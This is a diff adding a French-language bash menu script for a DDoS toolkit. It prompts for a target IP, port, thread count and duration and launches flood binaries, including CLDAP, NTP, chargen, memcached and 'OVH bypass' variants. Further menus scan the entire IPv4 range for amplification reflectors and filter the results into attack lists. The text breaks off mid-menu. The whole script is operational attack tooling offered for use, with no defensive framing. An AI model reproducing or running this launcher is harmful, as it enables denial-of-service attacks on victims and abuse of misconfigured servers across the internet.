@@ -1,0 +1,1353 @@
+ew#!/bin/bash
+BLACK='\e[0;30m'
+CYAN='\e[0;34m'
+CYAN='\e[0;32m'
+CYAN='\e[0;36m'
+RED='\e[0;31m'
+CYAN='\e[0;35m'
+RED='\e[0;33m'
+CYAN='\e[0;37m'
+CYAN='\e[1;30m'
+CYAN='\e[1;34m'
+CYAN='\e[1;32m'
+BLUE='\e[1;36m'
+CYAN='\e[1;31m'
+CYAN='\e[1;35m'
+CYAN='\e[1;33m'
+CYAN='\e[0;37m'
+CYAN='\e[1;37m'
+PINK='\e[1;35m'
+GREEN='\e[1;32m'
+NC='\e[0m'              # No Color
+
+dstat1()
+{
+    clear
+    echo -e " ${CYAN}
+  ┌───────────────────────────────────────────────────────────────────────┐
+  │                        \033[1;91mDSTAT${CYAN}                                          │
+  └───────────────────────────────────────────────────────────────────────┘
+"
+dstat
+}
+
+credits(){
+clear
+echo -e " ${CYAN}
+  ┌────────────────────────────────────────────────────────────────────────────┐
+  │                         \033[1;91mCREDITS${CYAN}                                            │
+  └────────────────────────────────────────────────────────────────────────────┘
+  ┌────────────────────────────────────────────────────────────────────────────┐
+  │                            Syntaxe#0001: MENU DEV                      │
+  │                            \033[1;91mSyntaxe#0001${CYAN}: AIDE                               │
+  └────────────────────────────────────────────────────────────────────────────┘
+  ┌────────────────────────────────────────────────────────────────────────────┐
+  │                         \033[1;91mESC PRODUCTION${CYAN}                                     │
+  └────────────────────────────────────────────────────────────────────────────┘
+"
+}
+
+sudp(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ TEMPS : "
+read time
+./gott.777 ${ip} ${port} 100 1024 50 ${time}
+}
+
+esp2(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ TEMPS : "
+read time
+./gott.888 ${ip} 100 -1 ${time}
+}
+
+massacre2(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ TEMPS : "
+read time
+./gott.999 ${ip} 100 -1 ${time}
+}
+
+cldap(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT (389): "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./cldap ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+cldapliste(){
+echo -en "
+┌─────────────────────┐
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (30-1000) : "
+read threads
+echo -en "
+│ MS (10-50): "
+read ms
+./cldapliste 192.168.1.1 198.255.255.255 ${liste} ${threads} ${ms}
+}
+
+ntp(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./ntp ${ip} ${liste} ${threads} ${limiter} ${time}
+}
+
+ntpliste(){
+echo -en "
+┌─────────────────────┐
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (30-1000) : "
+read threads
+echo -en "
+│ MS (10-50): "
+read ms
+./ntpliste 192.0.0.0 198.255.255.255 ${liste} ${threads} ${ms}
+}
+
+chargen(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./chargen ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+chargenliste(){
+echo -en "
+┌─────────────────────┐
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (30-1000) : "
+read threads
+echo -en "
+│ MS (10-50): "
+read ms
+./chargenliste 192.0.0.0 198.255.255.255 ${liste} ${threads} ${ms}
+}
+
+portmap(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./portmap ${ip} ${liste} ${threads} ${limiter} ${time}
+}
+
+portmapliste(){
+echo -en "
+┌─────────────────────┐
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (30-1000) : "
+read threads
+echo -en "
+│ MS (10-50): "
+read ms
+./portmapliste 192.0.0.0 255.255.255.255 ${liste} ${threads} ${ms}
+}
+
+ts3(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./ts ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+ts3liste(){
+echo -en "
+┌─────────────────────┐
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (30-1000) : "
+read threads
+echo -en "
+│ MS (10-50): "
+read ms
+./tss 1.0.0.0 255.255.255.255 ${liste} ${threads} ${ms}
+}
+
+dns(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./dns ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+ftp(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./tftp ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+icmp(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./icmp_multi ${ip} ${threads} ${limiter} 1 ${time}
+}
+
+grenade(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ TEMPS : "
+read time
+./grenade ${ip} ${threads} ${time} 0
+}
+
+mssql(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./mssql ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+netbios(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./netbios ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+nfo(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ TEMPS : "
+read time
+./nfo ${ip} ${threads} ${time}
+}
+
+nfolag(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ TEMPS : "
+read time
+./nfolag ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+rape(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./rape ${ip} ${port} ${threads} ${limiter} ${time}
+}
+
+udprand(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ TEMPS : "
+read time
+./randudp ${ip} ${port} ${threads} ${time}
+}
+
+udprandv2(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./udprand ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+stunovh(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./stunOVH ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+portmap(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./portmap ${ip} ${liste} ${threads} ${limiter} ${time}
+}
+
+quake(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./quake ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+rdp(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./rdp ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+rip(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./rip ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+sentinel(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./sentinel ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+snmp(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./snmp ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+steam(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./steam ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+tcp(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ TEMPS : "
+read time
+./TCP ${ip} ${port} ${liste} ${threads} ${time}
+}
+
+telnet(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./telnet ${ip} ${threads} ${limiter} ${time}
+}
+
+ts3v1(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ TEMPS : "
+read time
+./UDPxts3 ${ip} ${port} ${threads} ${time}
+}
+
+vse(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./VSE ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+udp(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./udp ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+udpvse(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ TEMPS : "
+read time
+./UDPVSE ${ip} ${port} ${liste} ${threads} ${time}
+}
+
+udptelnet(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./UDPTelnet ${ip} ${threads} ${limiter} ${time}
+}
+
+udpmulti(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./udpmulti ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+udpvse2(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ TEMPS : "
+read time
+./ts ${ip} ${port} ${liste} ${threads} ${time}
+}
+lbrother(){
+python3 lbrother.py
+}
+
+tcpbypass(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./tcpbypass ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+udpbypass(){
+echo -en "
+┌─────────────────────┐
+│ IP : "
+read ip
+echo -en "
+│ PORT : "
+read port
+echo -en "
+│ LISTE : "
+read liste
+echo -en "
+│ THREADS (100-1000) : "
+read threads
+echo -en "
+│ LIMITER (-1) : "
+read limiter
+echo -en "
+│ TEMPS : "
+read time
+./tcpbypass ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
+}
+
+ntpscan(){
+./ntpliste 0.0.0.0 255.255.255.255 ntp.txt 50 30
+}
+
+cldapscan(){
+./cldapliste 0.0.0.0 255.255.255.255 cldap.txt 50 30
+}
+
+chargenscan(){
+./chargenliste 0.0.0.0 255.255.255.255 chargen.txt 50 30
+}
+
+portmapscan(){
+./portmapliste 0.0.0.0 255.255.255.255 portmap.txt 50 30
+}
+
+ts3scan(){
+./ts3scan 0.0.0.0 255.255.255.255 ts3.txt 50 30
+}
+
+dnsscan(){
+./dnsscan 0.0.0.0 255.255.255.255 dns.txt 50 30
+}
+
+ftpscan(){
+./ftpscan 0.0.0.0 255.255.255.255 ftp.txt 50 30
+}
+
+grenadescan(){
+./grenadescan 0.0.0.0 255.255.255.255 grenade.txt 50 30
+}
+
+ldapscan(){
+./ldapscan 0.0.0.0 255.255.255.255 ldap.txt 50 30
+}
+
+mssqlscan(){
+./mssqlscan 0.0.0.0 255.255.255.255 mssql.txt 50 30
+}
+
+netbiosscan(){
+./netbioscan 0.0.0.0 255.255.255.255 netbios.txt 50 30
+}
+
+stunscan(){
+./stunscan 0.0.0.0 255.255.255.255 stun.txt 50 30
+}
+
+quakescan(){
+./quakescan 0.0.0.0 255.255.255.255 quake.txt 50 30
+}
+
+rdpscan(){
+./rdpscan 0.0.0.0 255.255.255.255 rdp.txt 50 30
+}
+
+ripscan(){
+./ripscan 0.0.0.0 255.255.255.255 rip.txt 50 30
+}
+
+sentinelscan(){
+./sentinelscan 0.0.0.0 255.255.255.255 sentinel.txt 50 30
+}
+
+snmpscan(){
+./snmpscan 0.0.0.0 255.255.255.255 snmp.txt 50 30
+}
+
+steamscan(){
+./ntpliste 0.0.0.0 255.255.255.255 steam.txt 50 30
+}
+
+tcpscan(){
+./tcpscan 0.0.0.0 255.255.255.255 tcp.txt 50 30
+}
+
+udpscan(){
+./udpscan 0.0.0.0 255.255.255.255 udp.txt 50 30
+}
+
+memcached(){
+./memscan 0.0.0.0 255.255.255.255 memcached.txt 50 30
+}
+
+filtrecldap(){
+cat cldap.txt | awk '{print $1}' | sort -u | sort -R > cldapfiltre.txt
+}
+
+filtrentp(){
+cat ntp.txt | awk '{print $1}' | sort -u | sort -R > filtrentp.txt
+}
+
+filtrechargen(){
+cat chargen.txt | awk '{print $1}' | sort -u | sort -R > chargenfiltre.txt
+}
+
+filtrets3(){
+cat ts3.txt | awk '{print $1}' | sort -u | sort -R > ts3filtre.txt
+}
+
+filtredns(){
+cat dns.txt | awk '{print $1}' | sort -u | sort -R > dnsfiltre.txt
+}
+
+filtreftp(){
+cat ftp.txt | awk '{print $1}' | sort -u | sort -R > ftpfiltre.txt
+}
+
+filtregrenade(){
+cat grenade.txt | awk '{print $1}' | sort -u | sort -R > grenadefiltre.txt
+}
+
+filtreldap(){
+cat ldap.txt | awk '{print $1}' | sort -u | sort -R > ldapfiltre.txt
+}
+
+filtremssql(){
+cat mssql.txt | awk '{print $1}' | sort -u | sort -R > mssqlfiltre.txt
+}
+
+filtrenetbios(){
+cat netbios.txt | awk '{print $1}' | sort -u | sort -R > netbiosfiltre.txt
+}
+
+filtrestun(){
+cat stun.txt | awk '{print $1}' | sort -u | sort -R > stunfiltre.txt
+}
+
+filtreportmap(){
+cat portmap.txt | awk '{print $1}' | sort -u | sort -R > portmapfiltre.txt
+}
+
+filtrequake(){
+cat quake.txt | awk '{print $1}' | sort -u | sort -R > quakefiltre.txt
+}
+
+filtrerdp(){
+cat rdp.txt | awk '{print $1}' | sort -u | sort -R > rdpfiltre.txt
+}
+
+filtrerip(){
+cat rip.txt | awk '{print $1}' | sort -u | sort -R > ripfiltre.txt
+}
+
+filtresentinel(){
+cat sentinel.txt | awk '{print $1}' | sort -u | sort -R > sentinelfiltre.txt
+}
+
+filtresnmp(){
+cat snmp.txt | awk '{print $1}' | sort -u | sort -R > snmpfiltre.txt
+}
+
+filtresteam(){
+cat steam.txt | awk '{print $1}' | sort -u | sort -R > steamfiltre.txt
+}
+
+filtretcp(){
+cat tcp.txt | awk '{print $1}' | sort -u | sort -R > tcpfiltre.txt
+}
+
+filtreudp(){
+cat udp.txt | awk '{print $1}' | sort -u | sort -R > udpfiltre.txt
+}
+
+filtrememcached(){
+cat memcached.txt | awk '{print $1}' | sort -u | sort -R > memcachedfiltre.txt
+}
+
+dliste(){
+echo -en "
+┌──────────────────────────┐
+│ LISTE (talisteamp.txt): "
+read liste
+rm ${liste}
+}
+
+_l4()
+{
+clear
+while :
+do
+clear;clear
+echo -en "
+
+\033[1;91m┌──────────────────────────────────┐
+\033[1;91m│${CYAN} [1]  [CLDAP]                     \033[1;91m│
+\033[1;91m│${CYAN} [2]  [NTP]                       \033[1;91m│
+\033[1;91m│${CYAN} [3]  [CHARGEN]                   \033[1;91m│
+\033[1;91m│${CYAN} [4]  [PORTMAP2]                  \033[1;91m│
+\033[1;91m│${CYAN} [5]  [TeamSpeak3]                \033[1;91m│
+\033[1;91m│${CYAN} [6]  [DNS]                       \033[1;91m│
+\033[1;91m│${CYAN} [7]  [FTP]                       \033[1;91m│
+\033[1;91m│${CYAN} [8]  [ICMP]                      \033[1;91m│
+\033[1;91m│${CYAN} [9]  [GRENADE]                   \033[1;91m│
+\033[1;91m│${CYAN} [10] [LDAP]                      \033[1;91m│
+\033[1;91m│${CYAN} [11] [MSSQL]                     \033[1;91m│
+\033[1;91m│${CYAN} [12] [NETBIOS]                   \033[1;91m│
+\033[1;91m│${CYAN} [13] [NFO]                       \033[1;91m│
+\033[1;91m│${CYAN} [14] [NFO-LAG]                   \033[1;91m│
+\033[1;91m│${CYAN} [15] [OVH-RAP]                   \033[1;91m│
+\033[1;91m│${CYAN} [16] [UDPRAND-OVH]               \033[1;91m│
+\033[1;91m│${CYAN} [17] [UDPRANDV2-OVH]             \033[1;91m│
+\033[1;91m│${CYAN} [18] [Stun-OVH]                  \033[1;91m│
+\033[1;91m│${CYAN} [19] [PORTMAP]                   \033[1;91m│
+\033[1;91m│${CYAN} [20] [QUAKE]                     \033[1;91m│
+\033[1;91m│${CYAN} [21] [RDP]                       \033[1;91m│
+\033[1;91m│${CYAN} [22] [RIP]                       \033[1;91m│
+\033[1;91m│${CYAN} [23] [SpoofUDP]                  \033[1;91m│
+\033[1;91m│${CYAN} [24] [ESP2]                      \033[1;91m│
+\033[1;91m│${CYAN} [25] [Massacre2]                 \033[1;91m│
+\033[1;91m│${CYAN} [26] [SENTINEL]                  \033[1;91m│
+\033[1;91m│${CYAN} [27] [SNMP]                      \033[1;91m│
+\033[1;91m│${CYAN} [28] [STEAM]                     \033[1;91m│
+\033[1;91m│${CYAN} [29] [TCP]                       \033[1;91m│
+\033[1;91m│${CYAN} [30] [TELNET]                    \033[1;91m│
+\033[1;91m│${CYAN} [31] [UDP-TS3]                   \033[1;91m│
+\033[1;91m│${CYAN} [32] [VSE]                       \033[1;91m│
+\033[1;91m│${CYAN} [33] [UDP]                       \033[1;91m│
+\033[1;91m│${CYAN} [34] [UDP-VSE]                   \033[1;91m│
+\033[1;91m│${CYAN} [35] [UDP-Telnet]                \033[1;91m│
+\033[1;91m│${CYAN} [36] [UDP-Multi]                 \033[1;91m│
+\033[1;91m│${CYAN} [37] [UDP-VSE2]                  \033[1;91m│
+\033[1;91m│${CYAN} [38] [TCP-BYPASS]                \033[1;91m│
+\033[1;91m│${CYAN} [39] [UDP-BYPASS]                \033[1;91m│
+\033[1;91m│${CYAN}  [S] SUPPRIMER UNE LISTE         \033[1;91m│
+\033[1;91m│${CYAN}  [R] RETOUR AU MENU              \033[1;91m│
+\033[1;91m└──────────────────────────────────┘
+${CYAN}[\033[1;91mP A B L O${CYAN}]-家 "
+    read yourch
+    case $yourch in
+          1) cldap ;;
+	  2) ntp ;;
+          3) chargen ;;
+	  4) portmap ;;
+	  5) ts3 ;;
+          6) dns ;;
+	  7) ftp ;;
+	  8) icmp ;;
+	  9) grenade ;;
+	  10) ldap ;;
+	  11) mssql ;;
+	  12) netbios ;;
+          13) nfo ;;
+	  14) nfolag ;;
+	  15) rape ;;
+	  16) udprand ;;
+	  17) udprandv2 ;;
+          18) stunovh ;;
+	  19) portmap ;;
+	  20) quake ;;
+	  21) rdp ;;
+	  22) rip ;;
+          23) sudp ;;
+	  24) esp2 ;;
+	  25) massacre2 ;;
+	  26) sentinel ;;
+	  27) snmp ;;
+          28) steam ;;
+	  29) tcp ;;
+	  30) telnet ;;
+	  31) ts3v1 ;;
+	  32) vse ;;
+          33) udp ;;
+	  34) udpvse ;;
+	  35) udptelnet ;;
+	  36) udpmulti ;;
+	  37) udpvse2 ;;
+          38) tcpbypass ;;
+	  39) udpbypass ;;
+	  S) dliste ;;
+	  R) Take_input1 ;;
+      *) echo "Selection invalide," ;
+         echo "Appuyez sur entrer." ; read ;;
+ esac
+done
+}
+
+dliste(){
+echo -en "
+┌──────────────────────────┐
+│ LISTE (talisteamp.txt): "
+read liste
+rm ${liste}
+}
+
+_l7()
+{
+clear
+while :
+do
+clear;clear
+echo -en "
+
+\033[1;91m┌──────────────────────────────────┐
+\033[1;91m│${CYAN} [1]  [Scan CLDAP->cldap.txt]     \033[1;91m│
+\033[1;91m│${CYAN} [2]  [ScanNTP->ntp.txt]          \033[1;91m│
+\033[1;91m│${CYAN} [3]  [ScanCHARGEN->chargen.txt]  \033[1;91m│
+\033[1;91m│${CYAN} [4]  [ScanTeamSpeak3->ts3.txt]   \033[1;91m│
+\033[1;91m│${CYAN} [5]  [ScanDNS->dns.txt]          \033[1;91m│
+\033[1;91m│${CYAN} [6]  [ScanFTP->ftp.txt]          \033[1;91m│
+\033[1;91m│${CYAN} [7]  [ScanGRENADE->grenade.txt]  \033[1;91m│
+\033[1;91m│${CYAN} [8]  [ScanLDAP->ldap.txt]        \033[1;91m│
+\033[1;91m│${CYAN} [9]  [ScanMSSQL->mssql.txt]      \033[1;91m│
+\033[1;91m│${CYAN} [10] [ScanNETBIOS->netbios.txt]  \033[1;91m│
+\033[1;91m│${CYAN} [11] [ScanStun-OVH->stun.txt]    \033[1;91m│
+\033[1;91m│${CYAN} [12] [ScanPORTMAP->portmap.txt]  \033[1;91m│
+\033[1;91m│${CYAN} [13] [ScanQUAKE->quake.txt]      \033[1;91m│
+\033[1;91m│${CYAN} [14] [ScanRDP->rdp.txt]          \033[1;91m│
+\033[1;91m│${CYAN} [15] [ScanRIP->rip.txt]          \033[1;91m│
+\033[1;91m│${CYAN} [16] [ScanSENTINEL->sentinel.txt]\033[1;91m│
+\033[1;91m│${CYAN} [17] [ScanSNMP->snmp.txt]        \033[1;91m│
+\033[1;91m│${CYAN} [18] [ScanSTEAM->steam.txt]      \033[1;91m│
+\033[1;91m│${CYAN} [19] [ScanTCP->tcp.txt]          \033[1;91m│
+\033[1;91m│${CYAN} [20] [ScanUDP->udp.txt]          \033[1;91m│
+\033[1;91m│${CYAN} [21] [ScanMEMCACH->memcached.txt]\033[1;91m│
+\033[1;91m│${CYAN}  [S] SUPPRIMER UNE LISTE         \033[1;91m│
+\033[1;91m│${CYAN}  [R] RETOUR AU MENU              \033[1;91m│
+\033[1;91m└──────────────────────────────────┘
+${CYAN}[\033[1;91mP A B L O${CYAN}]-家 "
+    read yourch
+    case $yourch in
+          1) cldapscan ;;
+	  2) ntpscan ;;
+          3) chargenscan ;;
+	  4) portmapscan ;;
+	  5) ts3scan ;;
+          6) dnsscan ;;
+	  7) ftpscan ;;
+	  8) grenadescan ;;
+	  9) ldapscan ;;
+	  10) mssqlscan ;;
+	  11) netbiosscan ;;
+          12) stunscan ;;
+	  13) quakescan ;;
+	  14) rdpscan ;;
+	  15) ripscan ;;
+	  16) sentinelscan ;;
+	  17) snmpscan ;;
+          18) steamscan ;;
+	  19) tcpscan ;;
+	  20) udpscan ;;
+	  21) memcached ;;	  	  
+	  S) dliste ;;
+	  R) Take_input1 ;;
+      *) echo "Selection invalide," ;
+         echo "Appuyez sur entrer." ; read ;;
+ esac
+done
+}
+
+_l5()
+{
+clear
+while :
+do
+clear;clear
+echo -en "
+
+\033[1;91m┌──────────────────────────────────┐
+\033[1;91m│${CYAN} [1]  [Filtrage Amp CLDAP]        \033[1;91m│
+\033[1;91m│${CYAN} [2]  [Filtrage Amp NTP]          \033[1;91m│
+\033[1;91m│${CYAN} [3]  [Filtrage Amp CHARGEN]      \033[1;91m│
+\033[1;91m│${CYAN} [4]  [Filtrage Amp TeamSpeak3]   \033[1;91m│
+\033[1;91m│${CYAN} [5]  [Filtrage Amp DNS]          \033[1;91m│
+\033[1;91m│${CYAN} [6]  [Filtrage Amp FTP]          \033[1;91m│
+\033[1;91m│${CYAN} [7]  [Filtrage Amp GRENADE]      \033[1;91m│
+\033[1;91m│${CYAN} [8]  [Filtrage Amp LDAP]         \033[1;91m│
+\033[1;91m│${CYAN} [9]  [Filtrage Amp MSSQL]        \033[1;91m│
+\033[1;91m│${CYAN} [10] [Filtrage Amp NETBIOS]      \033[1;91m│
+\033[1;91m│${CYAN} [11] [Filtrage Amp Stun-OVH]     \033[1;91m│
+\033[1;91m│${CYAN} [12] [Filtrage Amp ScanPORTMAP]  \033[1;91m│
+\033[1;91m│${CYAN} [13] [Filtrage Amp QUAKE]        \033[1;91m│
+\033[1;91m│${CYAN} [14] [Filtrage Amp RDP]          \033[1;91m│
+\033[1;91m│${CYAN} [15] [Filtrage Amp RIP]          \033[1;91m│
+\033[1;91m│${CYAN} [16] [Filtrage Amp SENTINEL]     \033[1;91m│
+\033[1;91m│${CYAN} [17] [Filtrage Amp SNMP]         \033[1;91m│
+\033[1;91m│${CYAN} [18] [Filtrage Amp STEAM]        \033[1;91m│
+\033[1;91m│${CYAN} [19] [Filtrage Amp TCP]          \033[1;91m│
+\033[1;91m│${CYAN} [20] [Filtrage Amp UDP]          \033[1;91m│
